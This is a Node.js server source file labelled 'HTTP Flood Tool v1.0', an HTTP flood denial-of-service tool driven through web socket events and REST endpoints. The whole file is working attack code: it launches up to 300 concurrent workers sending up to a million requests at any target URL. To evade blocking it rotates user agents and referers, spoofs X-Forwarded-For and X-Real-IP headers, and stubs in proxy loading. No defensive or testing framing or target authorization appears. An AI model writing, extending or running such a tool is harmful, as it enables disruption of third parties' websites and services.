const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Configuration
const CONFIG = {
  MAX_THREADS: 300,
  MAX_REQUESTS: 1000000,
  TIMEOUT: 7000,
  SEMAPHORE_LIMIT: 1000
};

// User Agents Database
const defaultUserAgents = [
  'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
  'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
  'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
  'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
  // ... (ALL THE USER AGENTS FROM YOUR PYTHON CODE - Include them all here)
  'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
];

// HTTP Headers
const acceptHeaders = [
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
  'Accept-Encoding: gzip, deflate\r\n',
  'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
  'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
  'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
  // ... (ALL ACCEPT HEADERS FROM PYTHON)
];

const referers = [
  'https://www.google.com/',
  'https://www.youtube.com/',
  'https://www.facebook.com/',
  // ... (ALL REFERERS FROM PYTHON)
];

// Attack Manager
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
    this.userAgents = this.loadUserAgents();
    this.proxies = this.loadProxies();
  }

  loadUserAgents() {
    try {
      if (fs.existsSync('us.txt')) {
        const data = fs.readFileSync('us.txt', 'utf8');
        return data.split('\n').filter(line => line.trim());
      }
    } catch (error) {
      console.log('Using default user agents');
    }
    return defaultUserAgents;
  }

  loadProxies() {
    try {
      if (fs.existsSync('proxy.txt')) {
        const data = fs.readFileSync('proxy.txt', 'utf8');
        return data.split('\n').filter(line => line.trim());
      }
    } catch (error) {
      console.log('No proxy file found');
    }
    return [];
  }

  randomIP() {
    return Array.from({length: 4}, () => Math.floor(Math.random() * 255) + 1).join('.');
  }

  randomUserAgent() {
    if (this.userAgents.length > 0) {
      return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }
    
    // Generate random user agent if none loaded
    const androidVersions = ['10', '11', '12', '13', '14'];
    const iosVersions = ['14_0', '15_2', '16_3', '17_1'];
    const androidDevices = ['SM-G991B', 'SM-A205U', 'Pixel 6', 'Redmi Note 10', 'OnePlus 9'];
    const iphoneModels = ['iPhone X', 'iPhone 11', 'iPhone 12', 'iPhone 13 Pro'];
    
    const uaType = ['android', 'iphone', 'windows', 'mac'][Math.floor(Math.random() * 4)];
    
    if (uaType === 'android') {
      const device = androidDevices[Math.floor(Math.random() * androidDevices.length)];
      const version = androidVersions[Math.floor(Math.random() * androidVersions.length)];
      const chrome = `${Math.floor(Math.random() * 23) + 100}.0.${Math.floor(Math.random() * 4000) + 1000}.100`;
      return `Mozilla/5.0 (Linux; Android ${version}; ${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chrome} Mobile Safari/537.36`;
    }
    
    if (uaType === 'iphone') {
      const ios = iosVersions[Math.floor(Math.random() * iosVersions.length)];
      const model = iphoneModels[Math.floor(Math.random() * iphoneModels.length)];
      return `Mozilla/5.0 (iPhone; CPU ${model} OS ${ios} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`;
    }
    
    return "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
  }

  async sendRequest(targetUrl, attackId, socket) {
    const headers = {
      'User-Agent': this.randomUserAgent(),
      'X-Forwarded-For': this.randomIP(),
      'X-Real-IP': this.randomIP(),
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'Accept-Encoding': acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)].split('\r\n')[0].split(': ')[1],
      'Referer': referers[Math.floor(Math.random() * referers.length)]
    };

    try {
      // Try with proxy if available
      if (this.proxies.length > 0) {
        const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
        // Note: In production, you would need a proxy agent library
        // This is simplified version
      }
      
      // Using fetch API for HTTP requests
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), CONFIG.TIMEOUT);
      
      const response = await fetch(targetUrl, {
        method: 'GET',
        headers: headers,
        signal: controller.signal,
        mode: 'no-cors' // Bypass CORS for testing
      });
      
      clearTimeout(timeoutId);
      
      if (socket) {
        socket.emit('packet_sent', {
          attackId: attackId,
          status: response.status,
          target: targetUrl
        });
      }
      
      return true;
    } catch (error) {
      if (socket) {
        socket.emit('packet_error', {
          attackId: attackId,
          error: error.message,
          target: targetUrl
        });
      }
      return false;
    }
  }

  async startAttack(targetUrl, threads, totalRequests, socket, attackId) {
    const attack = {
      id: attackId,
      target: targetUrl,
      threads: threads,
      totalRequests: totalRequests,
      sentRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      isRunning: true,
      startTime: Date.now()
    };

    this.activeAttacks.set(attackId, attack);

    // Create worker promises
    const workers = Array(threads).fill().map(async (_, workerId) => {
      while (attack.isRunning && attack.sentRequests < totalRequests) {
        attack.sentRequests++;
        
        try {
          const success = await this.sendRequest(targetUrl, attackId, socket);
          if (success) {
            attack.successfulRequests++;
          } else {
            attack.failedRequests++;
          }
        } catch (error) {
          attack.failedRequests++;
        }

        // Update progress every 100 requests
        if (attack.sentRequests % 100 === 0 && socket) {
          socket.emit('attack_progress', {
            attackId: attackId,
            sent: attack.sentRequests,
            successful: attack.successfulRequests,
            failed: attack.failedRequests,
            progress: Math.round((attack.sentRequests / totalRequests) * 100)
          });
        }

        // Small delay to prevent overwhelming
        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
      }
    });

    // Wait for all workers to complete
    await Promise.all(workers);
    
    // Mark attack as completed
    attack.isRunning = false;
    attack.endTime = Date.now();
    
    if (socket) {
      socket.emit('attack_complete', {
        attackId: attackId,
        summary: {
          totalSent: attack.sentRequests,
          successful: attack.successfulRequests,
          failed: attack.failedRequests,
          duration: attack.endTime - attack.startTime
        }
      });
    }

    return attack;
  }

  stopAttack(attackId) {
    const attack = this.activeAttacks.get(attackId);
    if (attack) {
      attack.isRunning = false;
      return true;
    }
    return false;
  }

  getAttackStatus(attackId) {
    return this.activeAttacks.get(attackId);
  }
}

// Initialize attack manager
const attackManager = new AttackManager();

// WebSocket/HTTP Routes
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);

  socket.on('start_attack', async (data) => {
    const { targetUrl, threads = 300, totalRequests = 1000000 } = data;
    
    if (!targetUrl) {
      socket.emit('error', { message: 'Target URL is required' });
      return;
    }

    const attackId = `attack_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    socket.emit('attack_started', {
      attackId: attackId,
      target: targetUrl,
      threads: threads,
      totalRequests: totalRequests,
      message: `Attack started with ${threads} threads`
    });

    // Start attack in background
    attackManager.startAttack(targetUrl, threads, totalRequests, socket, attackId)
      .catch(error => {
        console.error('Attack error:', error);
        socket.emit('attack_error', {
          attackId: attackId,
          error: error.message
        });
      });
  });

  socket.on('stop_attack', (data) => {
    const { attackId } = data;
    const stopped = attackManager.stopAttack(attackId);
    
    socket.emit('attack_stopped', {
      attackId: attackId,
      success: stopped,
      message: stopped ? 'Attack stopped successfully' : 'Attack not found'
    });
  });

  socket.on('get_stats', (data) => {
    const { attackId } = data;
    const stats = attackManager.getAttackStatus(attackId);
    
    socket.emit('attack_stats', {
      attackId: attackId,
      stats: stats
    });
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

// HTTP API Routes
app.post('/api/attack/start', async (req, res) => {
  try {
    const { targetUrl, threads = 300, totalRequests = 1000000 } = req.body;
    
    if (!targetUrl) {
      return res.status(400).json({ error: 'Target URL is required' });
    }

    const attackId = `api_attack_${Date.now()}`;
    
    // Start attack without socket updates
    attackManager.startAttack(targetUrl, threads, totalRequests, null, attackId)
      .then(attack => {
        // Do nothing - attack runs in background
      })
      .catch(error => {
        console.error('API Attack error:', error);
      });

    res.json({
      success: true,
      attackId: attackId,
      message: `Attack started against ${targetUrl}`,
      details: {
        threads: threads,
        totalRequests: totalRequests,
        startTime: new Date().toISOString()
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/attack/stop', (req, res) => {
  const { attackId } = req.body;
  const stopped = attackManager.stopAttack(attackId);
  
  res.json({
    success: stopped,
    message: stopped ? 'Attack stopped' : 'Attack not found'
  });
});

app.get('/api/attack/status/:id', (req, res) => {
  const attackId = req.params.id;
  const stats = attackManager.getAttackStatus(attackId);
  
  if (stats) {
    res.json({
      success: true,
      attack: stats
    });
  } else {
    res.status(404).json({
      success: false,
      message: 'Attack not found'
    });
  }
});

app.get('/api/system/info', (req, res) => {
  res.json({
    system: 'HTTP Flood Tool v1.0',
    maxThreads: CONFIG.MAX_THREADS,
    maxRequests: CONFIG.MAX_REQUESTS,
    timeout: CONFIG.TIMEOUT,
    activeAttacks: attackManager.activeAttacks.size,
    userAgentsLoaded: attackManager.userAgents.length,
    proxiesLoaded: attackManager.proxies.length
  });
});

// Serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📡 WebSocket available at ws://localhost:${PORT}`);
  console.log(`🌐 Web interface: http://localhost:${PORT}`);
});